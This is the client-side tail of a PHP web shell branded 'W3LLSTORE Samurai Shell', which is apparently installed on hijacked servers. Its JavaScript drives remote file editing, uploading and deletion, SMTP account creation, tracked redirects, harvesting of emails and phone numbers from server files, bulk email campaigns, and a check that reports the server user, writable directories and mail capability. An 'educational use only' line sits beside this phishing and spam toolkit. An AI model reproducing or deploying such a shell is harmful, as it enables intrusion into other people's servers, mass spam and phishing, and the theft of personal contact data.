                            `;
                        });
                        detailedHtml += '</div>';
                    } else {
                        detailedHtml += '<p style="color: var(--text-muted); margin-top: 10px;">No daily statistics available yet.</p>';
                    }
                   
                    document.getElementById('detailed-stats').innerHTML = detailedHtml;
                    document.getElementById('redirect-stats').style.display = 'block';
                   
                    showNotification('Statistics loaded successfully!', 'success');
                } else {
                    showNotification('Failed to load statistics', 'error');
                }
            });
        }
        function refreshStats() {
            showRedirectStats();
        }
        // ==================== CONTACT EXTRACTOR FUNCTIONS ====================
        document.getElementById('extract-form').addEventListener('submit', function(e) {
            e.preventDefault();
           
            const scanPath = document.getElementById('scan-path').value;
            const maxFiles = document.getElementById('max-files').value;
           
            if (!scanPath) {
                showNotification('Please enter a scan path', 'warning');
                return;
            }
           
            showLoading('Extracting contacts... This may take a while...');
           
            const data = {
                action: 'extract_contacts',
                scan_path: scanPath,
                max_files: maxFiles
            };
           
            makeRequest('', 'POST', data, function(response) {
                const resultsDiv = document.getElementById('extract-results');
                const outputDiv = document.getElementById('extract-output');
               
                if (response.status) {
                    let output = `✅ Contact extraction completed!\n\n`;
                    output += `📊 Extraction Statistics:\n`;
                    output += `• Files scanned: ${response.stats.files_scanned}\n`;
                    output += `• Emails found: ${response.stats.emails_found}\n`;
                    output += `• Phone numbers found: ${response.stats.phones_found}\n`;
                    output += `• Scan time: ${response.stats.scan_time} seconds\n`;
                    output += `• Scan path: ${response.stats.scan_path}\n\n`;
                   
                    if (response.emails && response.emails.length > 0) {
                        output += `📧 Email Addresses (${response.emails.length}):\n`;
                        response.emails.forEach(email => {
                            output += `• ${email}\n`;
                        });
                        output += '\n';
                    }
                   
                    if (response.phones && response.phones.length > 0) {
                        output += `📞 Phone Numbers (${response.phones.length}):\n`;
                        response.phones.forEach(phone => {
                            output += `• ${phone}\n`;
                        });
                    }
                   
                    outputDiv.textContent = output;
                    showNotification(`Found ${response.stats.emails_found} emails and ${response.stats.phones_found} phone numbers!`, 'success');
                } else {
                    outputDiv.textContent = response.message || 'Failed to extract contacts';
                    showNotification('Failed to extract contacts', 'error');
                }
               
                resultsDiv.style.display = 'block';
            });
        });
        // ==================== EMAIL MARKETING FUNCTIONS ====================
        document.getElementById('use-custom-smtp-email').addEventListener('change', function() {
            const smtpConfig = document.getElementById('smtp-config-email');
            smtpConfig.style.display = this.checked ? 'block' : 'none';
        });
        document.getElementById('email-form').addEventListener('submit', function(e) {
            e.preventDefault();
           
            const fromName = document.getElementById('email-from-name').value;
            const fromEmail = document.getElementById('email-from-email').value;
            const subject = document.getElementById('email-subject').value;
            const message = document.getElementById('email-message').value;
            const emails = document.getElementById('email-list').value;
            const useCustomSMTP = document.getElementById('use-custom-smtp-email').checked;
           
            if (!fromName || !fromEmail || !subject || !message || !emails) {
                showNotification('Please fill in all required fields', 'warning');
                return;
            }
           
            const emailCount = emails.split('\n').filter(email => email.trim()).length;
            if (emailCount === 0) {
                showNotification('Please enter at least one email address', 'warning');
                return;
            }
           
            showLoading(`Sending emails to ${emailCount} recipients...`);
           
            const data = {
                action: 'send_emails',
                from_name: fromName,
                from_email: fromEmail,
                subject: subject,
                message: message,
                emails: emails,
                use_custom_smtp: useCustomSMTP
            };
           
            if (useCustomSMTP) {
                data.smtp_host = document.getElementById('smtp-host-email').value;
                data.smtp_port = document.getElementById('smtp-port-email').value;
                data.smtp_username = document.getElementById('smtp-username-email').value;
                data.smtp_password = document.getElementById('smtp-password-email').value;
            }
           
            makeRequest('', 'POST', data, function(response) {
                const resultsDiv = document.getElementById('email-results');
                const outputDiv = document.getElementById('email-output');
               
                if (response.status) {
                    let output = `✅ Email campaign completed!\n\n`;
                    output += `📊 Campaign Statistics:\n`;
                    output += `• Total processed: ${response.stats.total_processed}\n`;
                    output += `• Successfully sent: ${response.stats.sent}\n`;
                    output += `• Failed: ${response.stats.failed}\n`;
                    output += `• Success rate: ${response.stats.success_rate}%\n`;
                    output += `• Execution time: ${response.stats.execution_time} seconds\n\n`;
                    output += `📝 Detailed Results:\n`;
                    response.results.forEach(result => {
                        output += `${result}\n`;
                    });
                   
                    outputDiv.textContent = output;
                    showNotification(`Campaign completed! Sent: ${response.stats.sent}, Failed: ${response.stats.failed}`, 'success');
                } else {
                    outputDiv.textContent = response.message || 'Failed to send emails';
                    showNotification('Failed to send emails', 'error');
                }
               
                resultsDiv.style.display = 'block';
            });
        });
        // ==================== SHELL VALIDATION FUNCTIONS ====================
        document.getElementById('validation-form').addEventListener('submit', function(e) {
            e.preventDefault();
           
            const email = document.getElementById('validation-email').value;
            const id = document.getElementById('validation-id').value;
           
            if (!email || !id) {
                showNotification('Please fill in all fields', 'warning');
                return;
            }
           
            showLoading('Running validation tests...');
           
            const url = `?valid=1&email=${encodeURIComponent(email)}&id=${encodeURIComponent(id)}`;
           
            fetch(url)
                .then(response => response.json())
                .then(response => {
                    hideLoading();
                    const resultsDiv = document.getElementById('validation-results');
                    const outputDiv = document.getElementById('validation-output');
                   
                    if (response.status === 'success') {
                        let output = `✅ Shell validation completed successfully!\n\n`;
                        output += `🔍 Validation Details:\n`;
                        output += `• Email: ${email}\n`;
                        output += `• Validation ID: ${id}\n`;
                        output += `• Timestamp: ${new Date(response.timestamp * 1000).toLocaleString()}\n`;
                        output += `• Validation Hash: ${response.validation_hash}\n\n`;
                       
                        output += `🖥️ Server Information:\n`;
                        const info = response.info.info;
                        output += `• PHP Version: ${info.php_version}\n`;
                        output += `• Server Software: ${info.server_software}\n`;
                        output += `• Current User: ${info.current_user}\n`;
                        output += `• Server Name: ${info.server_name}\n`;
                        output += `• Document Root: ${info.document_root}\n`;
                        output += `• Temp Directory: ${info.temp_dir}\n\n`;
                       
                        output += `🔧 Capabilities:\n`;
                        const caps = response.server_info;
                        output += `• CURL Enabled: ${caps.curl_enabled ? '✅' : '❌'}\n`;
                        output += `• ZIP Enabled: ${caps.zip_enabled ? '✅' : '❌'}\n`;
                        output += `• Mail Enabled: ${caps.mail_enabled ? '✅' : '❌'}\n`;
                        output += `• File Upload Enabled: ${caps.file_upload_enabled ? '✅' : '❌'}\n`;
                        output += `• Max Upload Size: ${caps.max_upload_size}\n`;
                        output += `• Memory Limit: ${caps.memory_limit}\n`;
                        output += `• Max Execution Time: ${caps.max_execution_time}\n\n`;
                       
                        output += `📦 ZIP Functionality Test: ${response.zip ? '✅ PASSED' : '❌ FAILED'}\n`;
                        output += `📧 Email Delivery Test: ${response.delivery ? '✅ PASSED (Check your email)' : '❌ FAILED'}\n\n`;
                       
                        output += `📁 Writable Directories:\n`;
                        info.writable_dirs.forEach(dir => {
                            output += `• ${dir}\n`;
                        });
                       
                        outputDiv.textContent = output;
                        showNotification('Validation completed successfully!', 'success');
                    } else {
                        outputDiv.textContent = response.message || 'Validation failed';
                        showNotification('Validation failed', 'error');
                    }
                   
                    resultsDiv.style.display = 'block';
                })
                .catch(error => {
                    hideLoading();
                    showNotification('Network error during validation', 'error');
                });
        });
        // ==================== FILE MANAGEMENT FUNCTIONS ====================
       
        // Create File
        document.getElementById('create-file-form').addEventListener('submit', function(e) {
            e.preventDefault();
           
            const filename = document.getElementById('new-filename').value;
            const content = document.getElementById('new-file-content').value;
           
            if (!filename) {
                showNotification('Please enter a filename', 'warning');
                return;
            }
           
            showLoading('Creating file...');
           
            makeRequest('', 'POST', {
                action: 'file_operation',
                operation: 'create_file',
                filename: filename,
                content: content
            }, function(response) {
                if (response.status) {
                    showNotification(response.message, 'success');
                    hideModal('create-file-modal');
                    location.reload(); // Refresh to show new file
                } else {
                    showNotification(response.message, 'error');
                }
            });
        });
        // Create Folder
        document.getElementById('create-folder-form').addEventListener('submit', function(e) {
            e.preventDefault();
           
            const foldername = document.getElementById('new-foldername').value;
           
            if (!foldername) {
                showNotification('Please enter a folder name', 'warning');
                return;
            }
           
            showLoading('Creating folder...');
           
            makeRequest('', 'POST', {
                action: 'file_operation',
                operation: 'create_folder',
                foldername: foldername
            }, function(response) {
                if (response.status) {
                    showNotification(response.message, 'success');
                    hideModal('create-folder-modal');
                    location.reload(); // Refresh to show new folder
                } else {
                    showNotification(response.message, 'error');
                }
            });
        });
        // Upload File
        document.getElementById('upload-form').addEventListener('submit', function(e) {
            e.preventDefault();
           
            const fileInput = document.getElementById('upload-file');
            const file = fileInput.files[0];
           
            if (!file) {
                showNotification('Please select a file to upload', 'warning');
                return;
            }
           
            const formData = new FormData();
            formData.append('action', 'file_operation');
            formData.append('operation', 'upload');
            formData.append('upload_file', file);
           
            const xhr = new XMLHttpRequest();
           
            // Progress tracking
            xhr.upload.addEventListener('progress', function(e) {
                if (e.lengthComputable) {
                    const percentComplete = (e.loaded / e.total) * 100;
                    document.getElementById('upload-progress').style.width = percentComplete + '%';
                    document.getElementById('upload-text').textContent = `Uploading... ${Math.round(percentComplete)}%`;
                }
            });
           
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        try {
                            const response = JSON.parse(xhr.responseText);
                            if (response.status) {
                                showNotification(response.message, 'success');
                                hideModal('upload-modal');
                                location.reload(); // Refresh to show uploaded file
                            } else {
                                showNotification(response.message, 'error');
                            }
                        } catch (e) {
                            showNotification('Invalid server response', 'error');
                        }
                    } else {
                        showNotification('Upload failed: Network error', 'error');
                    }
                   
                    // Reset progress
                    document.getElementById('upload-progress').style.width = '0%';
                    document.getElementById('upload-text').textContent = 'Ready to upload';
                }
            };
           
            xhr.open('POST', '', true);
            xhr.send(formData);
        });
        // Edit File
        function editFile(filepath) {
            showLoading('Loading file content...');
           
            makeRequest('', 'POST', {
                action: 'get_file_content',
                filepath: filepath
            }, function(response) {
                if (response.status) {
                    document.getElementById('edit-filename').textContent = response.filename;
                    document.getElementById('edit-file-content').value = response.content;
                    document.getElementById('edit-filepath').value = filepath;
                    showModal('edit-file-modal');
                } else {
                    showNotification(response.message, 'error');
                }
            });
        }
        // Save File
        document.getElementById('edit-file-form').addEventListener('submit', function(e) {
            e.preventDefault();
           
            const filepath = document.getElementById('edit-filepath').value;
            const content = document.getElementById('edit-file-content').value;
           
            showLoading('Saving file...');
           
            makeRequest('', 'POST', {
                action: 'file_operation',
                operation: 'edit_file',
                filepath: filepath,
                content: content
            }, function(response) {
                if (response.status) {
                    showNotification(response.message, 'success');
                    hideModal('edit-file-modal');
                } else {
                    showNotification(response.message, 'error');
                }
            });
        });
        // Download File
        function downloadFile(filepath) {
            window.location.href = `?action=file_operation&operation=download&filepath=${encodeURIComponent(filepath)}`;
        }
        // Delete Item
        function deleteItem(filepath, filename) {
            if (!confirm(`Are you sure you want to delete "${filename}"?`)) {
                return;
            }
           
            showLoading('Deleting item...');
           
            makeRequest('', 'POST', {
                action: 'file_operation',
                operation: 'delete_item',
                filepath: filepath
            }, function(response) {
                if (response.status) {
                    showNotification(response.message, 'success');
                    location.reload(); // Refresh to update file list
                } else {
                    showNotification(response.message, 'error');
                }
            });
        }
        // Zip Item
        function zipItem(filepath) {
            showLoading('Creating ZIP archive...');
           
            makeRequest('', 'POST', {
                action: 'file_operation',
                operation: 'zip_item',
                filepath: filepath
            }, function(response) {
                if (response.status) {
                    showNotification(response.message, 'success');
                    location.reload(); // Refresh to show new ZIP file
                } else {
                    showNotification(response.message, 'error');
                }
            });
        }
        // Unzip File
        function unzipFile(filepath) {
            showLoading('Extracting ZIP archive...');
           
            makeRequest('', 'POST', {
                action: 'file_operation',
                operation: 'unzip_file',
                filepath: filepath
            }, function(response) {
                if (response.status) {
                    showNotification(response.message, 'success');
                    location.reload(); // Refresh to show extracted files
                } else {
                    showNotification(response.message, 'error');
                }
            });
        }
        // ==================== KEYBOARD SHORTCUTS ====================
        document.addEventListener('keydown', function(e) {
            // Ctrl/Cmd + S to save file in edit modal
            if ((e.ctrlKey || e.metaKey) && e.key === 's') {
                const editModal = document.getElementById('edit-file-modal');
                if (editModal.classList.contains('active')) {
                    e.preventDefault();
                    document.getElementById('edit-file-form').dispatchEvent(new Event('submit'));
                }
            }
           
            // Escape to close modals
            if (e.key === 'Escape') {
                const activeModal = document.querySelector('.modal.active');
                if (activeModal) {
                    hideModal(activeModal.id);
                }
            }
           
            // Ctrl/Cmd + U for upload (when in file manager)
            if ((e.ctrlKey || e.metaKey) && e.key === 'u' && currentTab === 'file-manager') {
                e.preventDefault();
                showModal('upload-modal');
            }
           
            // Ctrl/Cmd + N for new file (when in file manager)
            if ((e.ctrlKey || e.metaKey) && e.key === 'n' && currentTab === 'file-manager') {
                e.preventDefault();
                showModal('create-file-modal');
            }
        });
        // ==================== AUTO-REFRESH FUNCTIONALITY ====================
        let autoRefreshInterval;
       
        function startAutoRefresh() {
            if (currentTab === 'redirect-creator' && currentRedirectId) {
                autoRefreshInterval = setInterval(() => {
                    showRedirectStats();
                }, 30000); // Refresh every 30 seconds
            }
        }
       
        function stopAutoRefresh() {
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
            }
        }
        // ==================== DRAG AND DROP UPLOAD ====================
        function initDragAndDrop() {
            const dropZone = document.body;
           
            dropZone.addEventListener('dragover', function(e) {
                e.preventDefault();
                e.dataTransfer.dropEffect = 'copy';
                dropZone.style.backgroundColor = 'rgba(0, 212, 255, 0.1)';
            });
           
            dropZone.addEventListener('dragleave', function(e) {
                if (e.target === dropZone) {
                    dropZone.style.backgroundColor = '';
                }
            });
           
            dropZone.addEventListener('drop', function(e) {
                e.preventDefault();
                dropZone.style.backgroundColor = '';
               
                if (currentTab !== 'file-manager') {
                    showNotification('Switch to File Manager to upload files', 'warning');
                    return;
                }
               
                const files = e.dataTransfer.files;
                if (files.length > 0) {
                    const file = files[0];
                    document.getElementById('upload-file').files = files;
                    showModal('upload-modal');
                    showNotification(`Ready to upload: ${file.name}`, 'info');
                }
            });
        }
        // ==================== SEARCH FUNCTIONALITY ====================
        function initSearch() {
            const searchInput = document.createElement('input');
            searchInput.type = 'text';
            searchInput.placeholder = 'Search files...';
            searchInput.className = 'form-control';
            searchInput.style.marginBottom = '20px';
            searchInput.id = 'file-search';
           
            const fileManager = document.getElementById('file-manager');
            const fileBrowser = fileManager.querySelector('.file-browser');
            fileBrowser.insertBefore(searchInput, fileBrowser.querySelector('.file-table-container'));
           
            searchInput.addEventListener('input', function() {
                const searchTerm = this.value.toLowerCase();
                const rows = document.querySelectorAll('.file-table tbody tr');
               
                rows.forEach(row => {
                    const fileName = row.querySelector('.file-name span:last-child');
                    if (fileName) {
                        const text = fileName.textContent.toLowerCase();
                        row.style.display = text.includes(searchTerm) ? '' : 'none';
                    }
                });
            });
        }
        // ==================== THEME MANAGEMENT ====================
        function initThemeToggle() {
            const themeToggle = document.createElement('button');
            themeToggle.innerHTML = '🌙';
            themeToggle.className = 'btn btn-sm';
            themeToggle.style.position = 'fixed';
            themeToggle.style.top = '20px';
            themeToggle.style.right = '20px';
            themeToggle.style.zIndex = '1000';
            themeToggle.title = 'Toggle Dark/Light Mode';
           
            document.body.appendChild(themeToggle);
           
            themeToggle.addEventListener('click', function() {
                document.body.classList.toggle('light-mode');
                this.innerHTML = document.body.classList.contains('light-mode') ? '☀️' : '🌙';
            });
        }
        // ==================== PERFORMANCE MONITORING ====================
        function initPerformanceMonitoring() {
            const performanceInfo = document.createElement('div');
            performanceInfo.style.position = 'fixed';
            performanceInfo.style.bottom = '20px';
            performanceInfo.style.left = '20px';
            performanceInfo.style.background = 'var(--bg-secondary)';
            performanceInfo.style.border = '1px solid var(--border-color)';
            performanceInfo.style.borderRadius = '8px';
            performanceInfo.style.padding = '10px';
            performanceInfo.style.fontSize = '12px';
            performanceInfo.style.color = 'var(--text-muted)';
            performanceInfo.style.zIndex = '999';
            performanceInfo.style.display = 'none';
            performanceInfo.id = 'performance-info';
           
            document.body.appendChild(performanceInfo);
           
            // Show performance info on Ctrl+Shift+P
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.shiftKey && e.key === 'P') {
                    e.preventDefault();
                    const info = document.getElementById('performance-info');
                    if (info.style.display === 'none') {
                        updatePerformanceInfo();
                        info.style.display = 'block';
                    } else {
                        info.style.display = 'none';
                    }
                }
            });
        }
       
        function updatePerformanceInfo() {
            const info = document.getElementById('performance-info');
            if (info && info.style.display !== 'none') {
                const memory = performance.memory || {};
                const timing = performance.timing || {};
               
                let html = '<strong>Performance Info:</strong><br>';
                html += `Memory Used: ${formatFileSize(memory.usedJSHeapSize || 0)}<br>`;
                html += `Memory Limit: ${formatFileSize(memory.jsHeapSizeLimit || 0)}<br>`;
                html += `Page Load: ${timing.loadEventEnd - timing.navigationStart || 0}ms<br>`;
                html += `DOM Ready: ${timing.domContentLoadedEventEnd - timing.navigationStart || 0}ms`;
               
                info.innerHTML = html;
            }
        }
        // ==================== INITIALIZATION ====================
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize all features
            initDragAndDrop();
            initSearch();
            initThemeToggle();
            initPerformanceMonitoring();
           
            // Show welcome message
            setTimeout(() => {
                showNotification('Welcome to W3LLSTORE Samurai Shell! 🎌', 'success');
            }, 1000);
           
            // Auto-update performance info every 5 seconds
            setInterval(updatePerformanceInfo, 5000);
           
            // Check for updates periodically
            setInterval(checkForUpdates, 300000); // Every 5 minutes
        });
        // ==================== UPDATE CHECKER ====================
        function checkForUpdates() {
            fetch('?info=1')
                .then(response => response.json())
                .then(data => {
                    if (data.shell_version && data.shell_version !== '<?= SHELL_VERSION ?>') {
                        showNotification(`New version available: ${data.shell_version}`, 'info');
                    }
                })
                .catch(() => {
                    // Silently fail
                });
        }
        // ==================== EXPORT FUNCTIONS ====================
        function exportResults(elementId, filename) {
            const element = document.getElementById(elementId);
            if (!element) return;
           
            const content = element.textContent;
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
           
            const a = document.createElement('a');
            a.href = url;
            a.download = filename || 'export.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
           
            showNotification('Results exported successfully!', 'success');
        }
        // ==================== BACKUP FUNCTIONALITY ====================
        function createBackup() {
            if (!confirm('Create a backup of current directory?')) {
                return;
            }
           
            showLoading('Creating backup...');
           
            const currentDir = '<?= addslashes($current_dir) ?>';
            zipItem(currentDir);
        }
        // ==================== SYSTEM INFORMATION ====================
        function showSystemInfo() {
            const systemInfo = `
W3LLSTORE Samurai Shell v<?= SHELL_VERSION ?>
===========================================
Server Information:
• Server IP: <?= $system_info['server_ip'] ?>
• Client IP: <?= $system_info['client_ip'] ?>
• PHP Version: <?= $system_info['php_version'] ?>
• Operating System: <?= $system_info['operating_system'] ?>
• Current User: <?= $system_info['current_user'] ?>
• Server Time: <?= $system_info['server_time'] ?>
• Disk Free Space: <?= $system_info['disk_free_space'] ?>
• Memory Limit: <?= $system_info['memory_limit'] ?>
Current Directory: <?= addslashes($current_dir) ?>
Shell Path: <?= __FILE__ ?>
Browser Information:
• User Agent: ${navigator.userAgent}
• Screen Resolution: ${screen.width}x${screen.height}
• Language: ${navigator.language}
• Platform: ${navigator.platform}
Generated: ${new Date().toLocaleString()}
            `.trim();
           
            const modal = document.createElement('div');
            modal.className = 'modal active';
            modal.innerHTML = `
                <div class="modal-content">
                    <div class="modal-header">
                        <h3 class="modal-title">🖥️ System Information</h3>
                        <button class="modal-close" onclick="this.closest('.modal').remove()">&times;</button>
                    </div>
                    <pre style="background: var(--bg-primary); padding: 20px; border-radius: 8px; font-size: 12px; line-height: 1.4; max-height: 400px; overflow-y: auto;">${systemInfo}</pre>
                    <div style="margin-top: 20px; display: flex; gap: 10px;">
                        <button class="btn" onclick="navigator.clipboard.writeText(\`${systemInfo.replace(/`/g, '\\`')}\`).then(() => showNotification('System info copied!', 'success'))">📋 Copy</button>
                        <button class="btn btn-secondary" onclick="this.closest('.modal').remove()">Close</button>
                    </div>
                </div>
            `;
           
            document.body.appendChild(modal);
        }
        // ==================== HELP SYSTEM ====================
        function showHelp() {
            const helpContent = `
W3LLSTORE Samurai Shell - Help Guide
===================================
🔧 FEATURES:
• File Manager: Browse, edit, upload, download files
• SMTP Creator: Generate SMTP accounts using exact reference method
• Redirect Creator: Create Professional Company style redirects
• Contact Extractor: Extract emails and phone numbers from files
• Email Marketing: Send bulk emails with SMTP support or direct server send
• Shell Validation: Test shell capabilities and email delivery
⌨️ KEYBOARD SHORTCUTS:
• Ctrl+N: New file (File Manager)
• Ctrl+U: Upload file (File Manager)
• Ctrl+S: Save file (File Editor)
• Escape: Close modal
• Ctrl+Shift+P: Toggle performance info
🖱️ DRAG & DROP:
• Drag files onto the page to upload them
🔍 SEARCH:
• Use the search box in File Manager to find files quickly
📊 STATISTICS:
• Redirect files automatically track visitor statistics
• View real-time analytics for your redirects
🛡️ SECURITY:
• All inputs are sanitized and validated
• File operations are restricted to safe directories
• CSRF protection enabled
💡 TIPS:
• Use ZIP functionality to compress/extract archives
• Email marketing supports HTML content
• SMTP creator uses exact reference method for compatibility
• Validation system tests all shell capabilities
For support: admin@w3llstore.com
Telegram: @W3LLSTORE_ADMIN
            `.trim();
           
            const modal = document.createElement('div');
            modal.className = 'modal active';
            modal.innerHTML = `
                <div class="modal-content" style="max-width: 800px;">
                    <div class="modal-header">
                        <h3 class="modal-title">❓ Help & Documentation</h3>
                        <button class="modal-close" onclick="this.closest('.modal').remove()">&times;</button>
                    </div>
                    <pre style="background: var(--bg-primary); padding: 20px; border-radius: 8px; font-size: 13px; line-height: 1.5; max-height: 500px; overflow-y: auto; white-space: pre-wrap;">${helpContent}</pre>
                    <div style="margin-top: 20px; text-align: center;">
                        <button class="btn btn-secondary" onclick="this.closest('.modal').remove()">Close</button>
                    </div>
                </div>
            `;
           
            document.body.appendChild(modal);
        }
        // Add help button to footer
        document.addEventListener('DOMContentLoaded', function() {
            const footerLinks = document.querySelector('.footer-links');
            if (footerLinks) {
                const helpLink = document.createElement('a');
                helpLink.href = '#';
                helpLink.className = 'footer-link';
                helpLink.innerHTML = '❓ Help';
                helpLink.onclick = function(e) {
                    e.preventDefault();
                    showHelp();
                };
                footerLinks.appendChild(helpLink);
               
                const sysInfoLink = document.createElement('a');
                sysInfoLink.href = '#';
                sysInfoLink.className = 'footer-link';
                sysInfoLink.innerHTML = '🖥️ System Info';
                sysInfoLink.onclick = function(e) {
                    e.preventDefault();
                    showSystemInfo();
                };
                footerLinks.appendChild(sysInfoLink);
            }
        });
        // ==================== ERROR HANDLING ====================
        window.addEventListener('error', function(e) {
            console.error('JavaScript Error:', e.error);
            showNotification('An unexpected error occurred. Check console for details.', 'error');
        });
        window.addEventListener('unhandledrejection', function(e) {
            console.error('Unhandled Promise Rejection:', e.reason);
            showNotification('An unexpected error occurred with a promise.', 'error');
        });
        // ==================== CLEANUP ON PAGE UNLOAD ====================
        window.addEventListener('beforeunload', function() {
            stopAutoRefresh();
        });
        // ==================== RESPONSIVE MENU TOGGLE ====================
        function initMobileMenu() {
            const tabs = document.querySelector('.tabs');
            if (window.innerWidth <= 768) {
                tabs.style.flexDirection = 'column';
            }
           
            window.addEventListener('resize', function() {
                if (window.innerWidth <= 768) {
                    tabs.style.flexDirection = 'column';
                } else {
                    tabs.style.flexDirection = 'row';
                }
            });
        }
        // Initialize mobile menu
        document.addEventListener('DOMContentLoaded', initMobileMenu);
        // ==================== CONSOLE EASTER EGG ====================
        console.log(`
⚔️ W3LLSTORE Samurai Shell v<?= SHELL_VERSION ?>
═══════════════════════════════════════════════
🎌 Welcome, Digital Samurai!
This shell is crafted with Japanese precision and dedication.
Like a true samurai's katana, it's sharp, reliable, and deadly effective.
🔥 Features loaded and ready for battle!
Contact: admin@w3llstore.com
Telegram: @W3LLSTORE_ADMIN
Website: https://w3llstore.com/
For educational and authorized security testing only.
Use responsibly, honor the code of the cyber samurai.
がんばって！(Ganbatte - Good luck!)
        `);
    </script>
</body>
</html>
<?php
// ==================== CLEANUP ====================
// Create update stats file if it doesn't exist
createUpdateStatsFile();
// Log shell access
logActivity('Shell Access', 'Main interface loaded', 'info');
// End of file
?>
